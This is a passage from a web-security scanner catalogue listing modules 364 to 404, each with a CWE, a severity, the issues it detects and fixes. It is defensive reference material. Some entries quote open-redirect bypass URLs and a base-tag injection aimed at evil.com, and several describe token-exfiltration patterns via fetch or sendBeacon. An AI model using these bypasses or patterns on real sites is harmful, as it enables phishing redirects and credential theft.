### 364. Portals SSRF / Sensitive Page Embedding
**Module:** `portals_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-918**

SSRF via portal src: portal src set from URL parameter enables server-side request forgery through the portal fetch Sensitive page in portal: admin/dashboard pages embedded in a portal context visible to potential clickjacking Auth data on activate: portal.activate() passing session tokens/auth data to the navigated page over postMessage channel Auto-activate without gesture: portal activated on page load performs navigation without user intent Missing origin check on message: portal communication without event.origin validation enables cross-origin message injection

**How to fix:**
- Never set portal src from URL parameters — hardcode portal src from a trusted allowlist
- Do not embed sensitive internal pages (admin, dashboard, settings) in portal contexts
- Never pass authentication tokens or session data in portal.activate() — use secure post-navigation auth flows
- Only call portal.activate() in response to explicit user gestures
- Validate event.origin in all portal message handlers before processing

**References:** [↗](https://wicg.github.io/portals/) · [↗](https://developer.chrome.com/blog/portals/)

---

### 365. Sensitive Data in Web Storage (localStorage)
**Module:** `local_storage_sensitive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-922**

JWT/OAuth tokens in localStorage: XSS on any page reads and exfiltrates authentication tokens Passwords stored in Web Storage: accessible to all same-origin JS including XSS payloads API keys in localStorage: credentials stolen by any XSS vulnerability on the site CSRF tokens in localStorage: defeats CSRF protection — XSS can read and replay tokens Browser extensions with host permissions can read localStorage across sessions Session tokens in localStorage persist beyond browser tab/session unlike sessionStorage

**How to fix:**
- Store authentication tokens in httpOnly, Secure, SameSite=Strict cookies instead of localStorage
- Use sessionStorage (not localStorage) for data that should not persist across tabs
- Never store passwords, API keys, or private keys in any Web Storage
- Store CSRF tokens in httpOnly cookies (double-submit or synchronizer token pattern)
- Implement strict CSP to reduce XSS risk that would allow localStorage theft

---

### 366. Privacy Sandbox API Usage
**Module:** `privacy_sandbox_apis` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Topics API observation (Observe-Browsing-Topics: ?1) collects user interest categories without explicit consent under GDPR Attribution Reporting API source/trigger registration enables cross-site attribution tracking — requires consent Shared Storage write enables cross-site data persistence that can track users across origins navigator.joinAdInterestGroup() adds users to behavioral targeting groups — requires GDPR consent Private State Token issuance creates a cross-site anti-fraud fingerprint that may require disclosure

**How to fix:**
- Only activate Topics API observation after obtaining explicit user consent for interest-based tracking
- Audit Attribution Reporting API registration headers and ensure consent flows cover attribution tracking
- Document all Privacy Sandbox API usage in privacy policy and obtain consent before engaging these APIs
- Implement consent-based activation: load Privacy Sandbox integrations only after consent is given

---

### 367. EXIF Metadata Leakage in Images
**Module:** `exif_metadata_exposure` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

GPS coordinates in EXIF: reveals exact location where photo was taken (user home, office) Camera model in EXIF: device fingerprinting, links photos to specific device Software version in EXIF: reveals editing software, OS, application versions for attack surface Author/artist EXIF field: PII disclosure — real name, username, email embedded in image file Timestamps in EXIF: reveals user activity patterns, timezone, exact time of image capture

**How to fix:**
- Strip EXIF metadata server-side before serving user-uploaded images (ImageMagick: -strip, Pillow: save without exif)
- Use a media processing pipeline that normalizes images on upload
- Never serve original uploaded files directly — always re-encode/resize
- Apply CSP to restrict loaded media origins
- Audit existing uploaded images for metadata leakage

**References:** [↗](https://cwe.mitre.org/data/definitions/200.html)

---

## Iframe & Cross-Origin

*9 scanners in this category.*

### 368. Iframe Sandbox Bypass Risk
**Module:** `iframe_security_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

sandbox='allow-scripts allow-same-origin' combination defeats iframe sandbox entirely Framed sensitive pages without X-Frame-Options allow clickjacking attacks Deprecated ALLOW-FROM directive not respected by modern browsers — false sense of security

**How to fix:**
- Never combine allow-scripts and allow-same-origin in iframe sandbox attribute
- Set Content-Security-Policy: frame-ancestors 'self' for all sensitive pages
- Replace X-Frame-Options: ALLOW-FROM with CSP frame-ancestors directive

---

### 369. Dangerous Iframe Permission Delegation
**Module:** `iframe_allow_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-732**

allow='*' grants every browser feature (camera, mic, payment, USB) to cross-origin iframes allow='camera' or allow='microphone' on third-party iframes enables covert eavesdropping allow='payment' enables embedded iframes to initiate Payment Request dialogs sandbox='allow-scripts allow-same-origin' combination defeats the sandbox entirely Cross-origin iframes without sandbox can run scripts, navigate parent, and access parent cookies

**How to fix:**
- Never use allow='*'; enumerate only required features explicitly
- Restrict high-risk features: camera, microphone, payment, usb should rarely be delegated to iframes
- Add sandbox attribute to all third-party iframes with minimum required tokens
- Never combine allow-scripts and allow-same-origin in sandbox attribute
- Implement Permissions-Policy header to enforce per-origin feature restrictions

---

### 370. Coop Security
**Module:** `coop_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

Cross-Origin Opener Policy (COOP) misuse — window.opener data accessed and transmitted to remote (cross-origin opener exfiltration), opener DOM/storage/navigation manipulation without COOP isolation, cross-origin popup controlled via retained opener reference, COOP set to weak same-origin-allow-popups.

**How to fix:**
- Set Cross-Origin-Opener-Policy: same-origin to break the opener relationship with cross-origin windows
- Do not transmit data obtained from window.opener to remote endpoints
- Avoid window.opener.localStorage or window.opener.document access without COOP protection
- Prefer same-origin over same-origin-allow-popups unless popup communication is strictly required

**References:** [↗](https://html.spec.whatwg.org/multipage/cross-origin-opener-policy.html) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 371. Coep Security
**Module:** `coep_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-208**

Cross-Origin Embedder Policy (COEP) misuse — SharedArrayBuffer transferred without COEP+COOP cross-origin isolation (Spectre risk), Atomics.wait/notify combined with network requests (high-resolution timing oracle), crossOriginIsolated=false with SAB/Atomics usage.

**How to fix:**
- Deploy both COEP: require-corp and COOP: same-origin before using SharedArrayBuffer or Atomics
- Do not use Atomics.wait/notify in combination with network requests that could leak timing information
- Check crossOriginIsolated before using SharedArrayBuffer and gracefully degrade if not isolated
- Use COEP: credentialless as an alternative when cannot control all embedded resources

**References:** [↗](https://wicg.github.io/cross-origin-embedder-policy/) · [↗](https://cwe.mitre.org/data/definitions/208.html)

---

### 372. Corp Security
**Module:** `corp_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

Cross-Origin Resource Policy (CORP) misconfiguration — CORP header set to cross-origin (allows any origin to embed resource, enabling Spectre attacks), no-cors mode on auth/token endpoints (opaque response bypass), SharedArrayBuffer/Atomics in cross-origin context (Spectre timing gadget).

**How to fix:**
- Set Cross-Origin-Resource-Policy: same-origin or same-site for sensitive resources
- Avoid CORP: cross-origin on resources that contain user data or authentication tokens
- Do not use mode: 'no-cors' for requests to auth/token/session endpoints
- Combine CORP with COEP and COOP for complete cross-origin isolation

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 373. URL Parser Differential / Open Redirect Bypass
**Module:** `url_parser_differential` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

user@host URL syntax: 'https://evil.com@trusted.com/' sends users to trusted.com but string-check sees evil.com Backslash normalization: 'https://example.com\evil.com' — browser converts \ to / yielding cross-origin redirect Null byte in URL: 'https://trusted.com%00.evil.com' — null terminates C-based parser allow-list check Protocol-relative URLs (//evil.com) bypass scheme-based allow-list checks Double-slash in redirect target followed by external domain bypasses prefix checks

**How to fix:**
- Parse redirect targets with a strict URL library (Python urllib.parse, Node URL) before allow-list comparison
- Compare the parsed hostname and scheme — never compare raw strings
- Reject any redirect target containing @, \, %00, or starting with //
- Use a strict allow-list of complete origins (scheme + host) for all redirects
- Audit all open redirect endpoints (redirect, return_to, next, url, dest parameters)

---

### 374. Credentialless Iframe Security
**Module:** `credentialless_iframe_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-668**

Credentialless iframe isolation bypass attempts — localStorage/cookie access from anonymous frame, postMessage exfiltrates auth/token from credentialless context, fetch with credentials:include bypasses credentialless intent.

**How to fix:**
- Do not attempt to access localStorage, sessionStorage, or cookies from credentialless iframe context
- Avoid postMessage communication of credentials from credentialless frames to parent
- Do not use fetch with credentials:include inside credentialless iframes
- Review credentialless iframe implementations against COEP isolation requirements

**References:** [↗](https://wicg.github.io/anonymous-iframe/) · [↗](https://cwe.mitre.org/data/definitions/668.html)

---

### 375. Missing Cross-Origin Isolation Headers
**Module:** `cross_origin_isolation` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-346**

Without COOP: same-origin, cross-origin windows retain a reference to this browsing context enabling popup-based attacks Without COEP: require-corp, cross-origin resources can be embedded without opt-in, enabling Spectre side-channel attacks Lack of cross-origin isolation allows attackers to exploit high-resolution timers and SharedArrayBuffer for timing attacks Missing CORP header allows any origin to embed this resource via no-cors fetch or <img> speculation

**How to fix:**
- Add Cross-Origin-Opener-Policy: same-origin to all page responses
- Add Cross-Origin-Embedder-Policy: require-corp and ensure all sub-resources serve CORP or CORS opt-in
- Add Cross-Origin-Resource-Policy: same-site (or same-origin for stricter isolation) to responses
- Test cross-origin isolation with browser DevTools: crossOriginIsolated should be true

---

### 376. Document-Policy Header Issues
**Module:** `document_policy_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-693**

Missing no-document-write leaves document.write() DOM sink available — a known XSS injection vector js-profiling enabled in Document-Policy allows JavaScript profiling access for timing oracle attacks Missing Require-Document-Policy means embedded iframes are not required to adopt the same security policy Document-Policy in report-only mode means violations are logged but not blocked

**How to fix:**
- Add 'no-document-write' to Document-Policy to disable the document.write() DOM XSS sink
- Remove 'js-profiling' from production Document-Policy; enable only in developer environments
- Add Require-Document-Policy: <policy> to enforce document policy on embedded iframes
- Migrate Document-Policy-Report-Only to the enforcing Document-Policy header

---

## Email & Miscellaneous

*13 scanners in this category.*

### 377. Email / SMTP Credential Exposure
**Module:** `email_config_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

SMTP credentials in JavaScript allow account takeover of the email service Exposed MailHog / mail catcher UI gives access to all internal email traffic x-mailer headers leak MTA vendor and version enabling targeted exploit research

**How to fix:**
- Never embed SMTP credentials in client-side JavaScript — use server-side email sending
- Remove or firewall MailHog and all mail debugging UIs in production
- Strip x-mailer, x-originating-ip, and x-php-originating-script response headers

---

### 378. HTTP/2 Rapid Reset (CVE-2023-44487)
**Module:** `http2_rapid_reset` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-400**

Rapid Reset allows a single client to overwhelm servers by opening and immediately cancelling HTTP/2 streams at extreme rates Attack bypasses traditional connection-count DoS mitigations — uses valid connection, no bandwidth amplification Affected all major web servers and cloud load balancers before October 2023 patches gRPC services are especially vulnerable — HTTP/2 is mandatory and often less hardened

**How to fix:**
- Update web server: nginx ≥1.25.3, Apache ≥2.4.58, h2o ≥2.2.6, Caddy ≥2.7.5
- Enable SETTINGS_MAX_CONCURRENT_STREAMS ≤100 on your HTTP/2 server configuration
- Use a CDN/WAF with Rapid Reset mitigation (Cloudflare, AWS CloudFront, Google Cloud Armor all patched Oct 2023)
- Implement per-IP RST_STREAM rate limiting at the infrastructure layer

---

### 379. Form Data Security
**Module:** `form_data_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

FormData API misuse — credentials/tokens appended as form fields in multipart upload, form field value sourced from URL parameter (attacker-controlled submission), file/blob uploaded to external endpoint.

**How to fix:**
- Never append auth tokens, API keys, or credentials as FormData fields
- Validate all FormData field values — never include raw URL parameter values
- Restrict file upload destinations to same-origin endpoints using CSP connect-src
- Implement CSRF protection for all FormData submissions

**References:** [↗](https://xhr.spec.whatwg.org/#formdata) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 380. FormData API Security
**Module:** `form_data_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

FormData containing password/token/credential sent via fetch/sendBeacon: credential exfiltration via form harvesting FormData submitted to third-party external URL: user form data including PII sent to non-same-origin endpoint FormData values sourced from URL parameters: attacker-controlled form field values injected into submission new FormData(form) all fields harvested and transmitted: complete form including hidden fields exfiltrated

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/FormData) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 381. Insecure File Upload
**Module:** `file_upload_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-434**

Upload endpoints accepting .php/.jsp/.asp allow remote code execution via webshell Content-Type only validation bypassed by changing MIME type — extension not checked SVG / HTML upload allows stored XSS executed in victim's browser

**How to fix:**
- Allowlist safe file extensions; reject .php, .jsp, .asp, .html, .svg at upload
- Re-encode all uploaded images server-side to strip embedded code
- Store uploads outside the web root or in a separate domain without execute permissions

---

### 382. File Inclusion / Path Traversal (Client-Side)
**Module:** `file_inclusion_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-22** &nbsp;|&nbsp; **MITRE:** T1083

Detects JavaScript patterns where file read operations (fs.readFile, require()) accept paths built from URL parameters or user input, enabling path traversal via ../ sequences. Attackers can read arbitrary files outside the web root, including configuration files with secrets.

**How to fix:**
- Never pass URL parameters directly to file system APIs
- Resolve paths with path.resolve() and verify they fall within an allowed base directory
- Maintain an allowlist of permitted filenames rather than accepting arbitrary paths
- Use a chroot or sandbox to limit file system access

**References:** [↗](https://owasp.org/www-community/attacks/Path_Traversal) · [↗](https://cwe.mitre.org/data/definitions/22.html)

---

### 383. Chrome Origin Trial Dangerous Feature
**Module:** `origin_trial_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

DirectSockets origin trial enables raw TCP/UDP socket access from browser — bypasses same-origin policy for network connections SharedStorageAPI enables cross-context data read-back via worklets, potentially leaking user state across sites Third-party origin trial tokens enable experimental APIs for all embedded third-party scripts on the page Origin-Trial header reveals experimental feature adoption, giving attackers a map of non-standard APIs available on the page

**How to fix:**
- Remove Origin-Trial tokens for features no longer actively used
- Avoid third-party origin trials (isThirdParty: true) unless strictly necessary
- Audit all active origin trials quarterly against the Chrome Origin Trials registry
- Do not use DirectSockets, SharedStorageAPI, or Private Network Access trials in production without security review

---

### 384. Timing Side-Channel Vulnerability Indicators
**Module:** `timing_attack_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-208** &nbsp;|&nbsp; **MITRE:** T1110

Detects timing attack indicators: direct === or == equality comparison on tokens/passwords/secrets (JavaScript string comparison short-circuits enabling character-by-character brute force), .equals()/strcmp() on security values (not constant-time; network-measurable timing enables oracle attacks), early return on credential mismatch (faster rejection leaks prefix match), and X-Response-Time/X-Runtime headers disclosing per-request processing time for statistical oracle attacks.

**How to fix:**
- Use constant-time comparison functions: Node.js crypto.timingSafeEqual(), Python hmac.compare_digest()
- Never return early on partial credential matches — process the full comparison regardless of outcome
- Remove X-Response-Time, X-Runtime, and X-Request-Duration headers from production responses
- Use structured timing measurements only in non-production monitoring systems

**References:** [↗](https://codahale.com/a-lesson-in-timing-attacks/) · [↗](https://cwe.mitre.org/data/definitions/208.html)

---

### 385. Race Condition Vulnerability Indicators
**Module:** `race_condition_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-362** &nbsp;|&nbsp; **MITRE:** T1499

Detects passive indicators of race condition vulnerabilities: financial operation endpoints (transfer, withdraw, checkout) without Idempotency-Key headers, balance/stock/credit counters in responses without optimistic locking (ETag/Last-Modified), Time-of-Check-Time-of-Use (TOCTOU) patterns where balance is checked before update without atomic operation, and coupon/voucher redemption endpoints without idempotency protection enabling double-spend attacks.

**How to fix:**
- Require and validate Idempotency-Key headers on all financial and state-changing endpoints
- Use atomic database operations (UPDATE ... WHERE balance >= amount) instead of read-check-write
- Implement optimistic locking with ETag/version fields for concurrent resource updates
- Use distributed locks (Redis SETNX) for coupon/voucher redemption with short TTL

**References:** [↗](https://portswigger.net/web-security/race-conditions) · [↗](https://cwe.mitre.org/data/definitions/362.html)

---

### 386. Form Security Issues
**Module:** `form_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-352**

Forms without CSRF tokens vulnerable to Cross-Site Request Forgery Autocomplete on password fields can harvest credentials from shared devices

**How to fix:**
- Add CSRF tokens to all state-changing form submissions
- Set autocomplete='off' on sensitive fields (passwords, credit cards)
- Ensure all form actions use HTTPS

---

### 387. Resource Hints Security Issues
**Module:** `link_resource_hints_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

dns-prefetch or preconnect to internal/RFC-1918 addresses exposes internal network topology to page visitors prefetch/preload of sensitive API paths or admin URLs reveals backend architecture and may trigger rate limits modulepreload from CDN without SRI integrity attribute is vulnerable to supply chain compromise Cross-origin preload without crossorigin attribute causes double fetch — one unauthenticated, one with credentials

**How to fix:**
- Remove dns-prefetch and preconnect hints pointing to internal/RFC-1918 addresses or internal hostnames
- Restrict prefetch and preload to publicly-cacheable, non-sensitive assets only
- Add integrity='sha384-...' and crossorigin='anonymous' to all CDN modulepreload links
- Audit <link rel> elements for cross-origin preload that require the crossorigin attribute

---

### 388. HTTP 103 Early Hints Path Disclosure
**Module:** `http_early_hints_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Sensitive paths in Link headers: /admin, /internal, /api preload hints enumerate internal structure before page loads External preload enabling tracking: third-party servers receive connection requests for every page visit via preload hints Credentials embedded in preload URL: basic auth in Link header URL exposes credentials to any observer Cache poisoning via preload: attacker manipulates cached preloaded resources to serve malicious content Internal service discovery: Link preload headers reveal backend service URLs, microservice topology, CDN origins

**How to fix:**
- Audit all Link: preload headers — remove paths that expose internal service URLs or admin endpoints
- Restrict preload hints to same-origin resources or trusted CDNs with SRI hashes
- Never embed credentials in preload URL — use cookie-based auth for preloaded resources
- Review 103 Early Hints responses in staging before deploying — they're sent before the main response is processed
- Monitor Link headers in CSP violation reports — unexpected preloads may indicate cache poisoning

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/103) · [↗](https://www.rfc-editor.org/rfc/rfc8297)

---

### 389. Fetch Priority Security
**Module:** `fetch_priority_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-208**

Fetch Priority API misuse — fetchpriority/importance attribute set from URL parameter (priority injection), fetch priority combined with performance timing (timing side-channel oracle), priority correlated with auth/session state (covert channel for user state inference).

**How to fix:**
- Do not set fetchpriority or importance attributes from URL parameters or user input
- Avoid combining fetch priority manipulation with high-resolution performance timing measurements
- Do not use fetch priority as a covert channel to encode user authentication state
- Audit resource hints and fetch priority assignments for potential timing side-channel exposure

**References:** [↗](https://wicg.github.io/priority-hints/) · [↗](https://cwe.mitre.org/data/definitions/208.html)

---

## Other Scanners

*16 scanners in this category.*

### 390. XML External Entity / DTD Exposure
**Module:** `xml_security_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-611**

XXE via DOCTYPE/ENTITY declarations allows server-side file read (e.g., /etc/passwd) SSRF via external entity URIs reaches internal services and cloud metadata endpoints Billion Laughs DoS attack via exponentially expanding entity references Exposed WSDL/SOAP endpoints reveal internal service structure and method signatures

**How to fix:**
- Disable external entity processing: libxml2 LIBXML_NOENT off, FEATURE_EXTERNAL_GENERAL_ENTITIES false
- Use a deny-by-default XML parser configuration — whitelist only required features
- Validate and sanitize XML input before parsing; reject DOCTYPE declarations
- Restrict access to WSDL/SOAP endpoints via authentication or IP allowlist

---

### 391. Base URI Injection / Missing base-uri CSP
**Module:** `base_uri_injection` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-693**

Missing base-uri CSP: attacker injects <base href='https://evil.com/'> to redirect all relative resource loads With base tag injection, all relative <script src>, <link href>, <form action> resolve to attacker's origin base-uri wildcard (*) provides zero protection — same as omitting the directive <base href> to external origin silently redirects all relative fetches to a different host HTTP base href on HTTPS page downgrades all relative resource loads to cleartext

**How to fix:**
- Add base-uri 'self' or base-uri 'none' to every Content-Security-Policy
- Never set base-uri to '*'; use specific origins or 'none'
- Ensure <base href> only uses HTTPS and points to the same origin
- Use exactly one <base> element per page; validate for injection in dynamic HTML generation
- Apply output encoding to any user-controlled content that may appear in <head>

---

### 392. BREACH Compression Oracle / Zip Bomb
**Module:** `compression_streams_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-311**

BREACH oracle: compressing secrets concatenated with attacker-controlled input leaks secret length via compressed size — same attack class as BREACH/CRIME Decompress from URL param: decompressing attacker-supplied data risks zip bombs (>1000x expansion ratio) causing OOM/DoS No size limit: DecompressionStream without a byte limit allows decompressed output to exhaust browser memory Size oracle: transmitting compressed byte length enables inference of plaintext content length Compressed secrets transmitted: even encrypted transport of compressed+secret data is vulnerable to adaptive chosen-plaintext

**How to fix:**
- Never concatenate secrets with user-controlled data before compression — compress them separately
- Enforce a maximum decompressed size limit before feeding remote data into DecompressionStream
- Validate and sanitize all compressed input sources — reject data from untrusted URL parameters
- Do not transmit the compressed size of responses containing sensitive content
- Use random padding or chunked streaming to obscure compressed output length from network observers

**References:** [↗](https://www.breachattack.com/) · [↗](https://www.w3.org/TR/compression-streams/)

---

### 393. Protocol Handler Registration Abuse / Phishing
**Module:** `url_protocol_handler_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Handler URL from URL param: registerProtocolHandler target URL derived from URL parameter — attacker registers their server as handler via URL manipulation Built-in protocol override: registering http/https/ftp handler — if permitted, intercepts all browser navigation (blocked by browsers but indicates malicious intent) Sensitive protocol handler: mailto/tel/sms handler registered — all email links and phone links on the device handled by this origin Auto-registered on load: handler registered silently on page load — user visits page and gains a background protocol handler without any user action %s placeholder injection: URL parameter injected into handler URL template — attacker controls data sent to handler when protocol link is clicked

**How to fix:**
- Never derive registerProtocolHandler URL from URL parameters — hardcode the handler URL
- Only call registerProtocolHandler in response to an explicit user action (button click)
- Restrict protocol handler registration to web+ prefixed custom protocols — avoid mailto/tel/sms
- Validate the %s placeholder URL is always URL-encoded and sanitized on the receiving end
- Implement CSP to restrict which APIs can be called on security-sensitive pages

**References:** [↗](https://html.spec.whatwg.org/multipage/system-state.html#custom-handlers) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler)

---

### 394. Ink API Handwriting Surveillance
**Module:** `ink_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Stroke data exfiltrated: ink stroke/point coordinates transmitted to remote — handwritten input (may include signatures, PINs, passwords) exfiltrated Pressure/tilt biometric exfiltrated: stylus pressure, tiltX, tiltY transmitted — unique stylus pressure profile enables biometric fingerprinting across sessions Presenter target from URL param: Ink API requestPresenter() target from URL parameter — attacker redirects low-latency ink rendering to controlled DOM element Continuous pointermove recording: all pointer movement collected in loop — complete stylus trace recorded for offline handwriting analysis Ink data stored to localStorage: stroke data written to localStorage — handwritten content persisted across sessions and accessible to all origin scripts

**How to fix:**
- Never transmit ink stroke coordinates, pressure, or tilt values to remote servers
- Process handwriting recognition entirely on-device — do not relay raw ink data to any endpoint
- Do not derive requestPresenter() target element from URL parameters
- Limit ink point collection to the duration of an active user gesture — clear collected points on pointer-up
- Do not store raw ink stroke data in localStorage or sessionStorage

**References:** [↗](https://wicg.github.io/ink-enhancement/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Ink_API)

---

### 395. Beacon Api Security
**Module:** `beacon_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-201**

Beacon API misuse — sendBeacon() transmits credentials/tokens as covert exfiltration channel, beacon to external URL without validation, beacon URL from URL parameter (SSRF), PII transmitted without consent.

**How to fix:**
- Never include auth tokens, session cookies, or localStorage credentials as sendBeacon payload
- Validate and allowlist sendBeacon destination URLs — never source from URL parameters
- Implement Content-Security-Policy connect-src to restrict beacon destinations
- Ensure GDPR/CCPA consent before transmitting PII via sendBeacon

**References:** [↗](https://www.w3.org/TR/beacon/) · [↗](https://cwe.mitre.org/data/definitions/201.html)

---

### 396. Object Url Security
**Module:** `object_url_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-94**

Object URL / Blob URL misuse — URL.createObjectURL() creates blob from credentials/tokens (sensitive data encoded in blob), blob content from URL parameter (attacker-controlled blob injection), createObjectURL() used to inject Worker code (dynamic code execution via blob: Worker).

**How to fix:**
- Never include credentials, tokens, or sensitive data in blob content passed to URL.createObjectURL()
- Do not construct Blob content from URL parameters or user-controlled input
- Avoid using URL.createObjectURL() to create Worker script URLs from untrusted content
- Always call URL.revokeObjectURL() after use to prevent memory leaks and URL retention

**References:** [↗](https://www.w3.org/TR/FileAPI/#url) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 397. AudioWorklet / AudioContext Security
**Module:** `audio_worklet_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

AudioContext characteristics transmitted for fingerprinting: sampleRate/baseLatency/channelCount used as device identifier AudioWorkletNode connected to microphone with network exfil: audio surveillance via Web Audio API pipeline audioWorklet.addModule() URL from URL parameter: attacker-controlled worklet code loading (arbitrary code execution) AudioContext timing covert channel: currentTime/outputLatency precision used to leak cross-origin timing information

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/AudioWorklet) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 398. RTCInsertableStreams / Encoded Transform Security
**Module:** `rtc_encoded_transform_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-311**

RTCEncodedVideoFrame/AudioFrame exfiltrated to remote: WebRTC media stream intercepted via insertable streams API SFrameTransform encryption key from URL parameter: attacker-controlled key material used to encrypt WebRTC media Math.random/xor used instead of SubtleCrypto: weak DIY encryption applied to video/audio frames readable.pipeTo(writable) passthrough without transform: insertable streams used as tap without any encryption

**References:** [↗](https://www.w3.org/TR/webrtc-encoded-transform/) · [↗](https://cwe.mitre.org/data/definitions/311.html)

---

### 399. Handwriting Recognition API Security
**Module:** `handwriting_recognition_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Handwriting stroke/drawing data transmitted remotely: user handwriting input (passwords, PINs, sensitive notes) exfiltrated HandwritingRecognizer language/hints configuration transmitted: recognizer settings reveal user locale and input preferences createHandwritingRecognizer() from URL parameter: attacker-controlled recognizer configuration injected Continuous HandwritingStroke capture with network exfil: covert ongoing handwriting surveillance stream

**References:** [↗](https://wicg.github.io/handwriting-recognition/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 400. Storage Event Security
**Module:** `storage_event_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

localStorage/sessionStorage.getItem() result transmitted via fetch/sendBeacon: stored data exfiltrated from browser storage localStorage.setItem() stores password/token/credential in plaintext: sensitive data persisted without encryption in browser storage storage event listener transmits cross-tab changes to remote: cross-tab storage activity exfiltrated via storage event surveillance localStorage.setItem() value from URL parameter: attacker-controlled data written to persistent browser storage (storage poisoning)

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 401. Refresh Token Leakage / Insecure Storage
**Module:** `token_refresh_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-522** &nbsp;|&nbsp; **MITRE:** T1528

Detects refresh tokens in URL parameters (logged in server access logs), refresh/access tokens in localStorage/sessionStorage (XSS-accessible), refresh token exfiltration via fetch/sendBeacon, and token logging to console.

**How to fix:**
- Never pass refresh tokens in URL parameters — use secure httpOnly cookies
- Store tokens in memory or httpOnly cookies, not localStorage/sessionStorage
- Never log access or refresh tokens to console in production
- Implement refresh token rotation — invalidate old refresh token after each use

**References:** [↗](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/) · [↗](https://cwe.mitre.org/data/definitions/522.html)

---

### 402. Permissions API Fingerprinting
**Module:** `permissions_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Bulk permission enumeration: querying camera+mic+location+clipboard state creates unique fingerprint across browser sessions Permission state transmitted to server: combination of granted/denied permissions sent to analytics uniquely identifies device Sensitive permission without context: requesting camera/mic permissions outside user interaction pattern feels coercive Cross-site correlation: stable permission state fingerprint correlates authenticated and anonymous sessions Permission state reveals user behavior: 'denied' state shows prior user decisions about privacy-sensitive features

**How to fix:**
- Only query permission state when needed for a specific user-triggered action — not on page load
- Never transmit permission states to server-side analytics — this constitutes device fingerprinting
- Request sensitive permissions (camera, microphone) only in direct response to user gesture with clear UI context
- Limit permission queries to what the feature actually needs — do not enumerate all permissions
- Implement permission prompts with clear explanations of why access is needed and how it will be used

**References:** [↗](https://w3c.github.io/permissions/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API)

---

### 403. Page Lifecycle API Security
**Module:** `page_lifecycle_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Data exfiltrated on freeze event: sendBeacon/fetch in freeze handler drains session state on tab background/close visibilitychange events transmitted to analytics: tab focus/blur patterns used for user attention surveillance wasDiscarded flag transmitted to remote: page discard state fingerprints session recovery behaviour Keydown captured while document.hidden: keyboard input surveillance continues when page is backgrounded

**References:** [↗](https://wicg.github.io/page-lifecycle/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 404. Animation Worklet (Houdini) Security
**Module:** `animation_worklet_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

animationWorklet.addModule() URL from URL parameter: attacker-controlled animation worklet code loaded and executed Animation worklet loaded from external third-party URL: untrusted code runs in worklet sandbox with timing access WorkletAnimation timing values transmitted remotely: animation timeline precision used as cross-origin timing channel registerAnimator computed timing data exfiltrated: animation worklet exposes high-resolution timing to remote

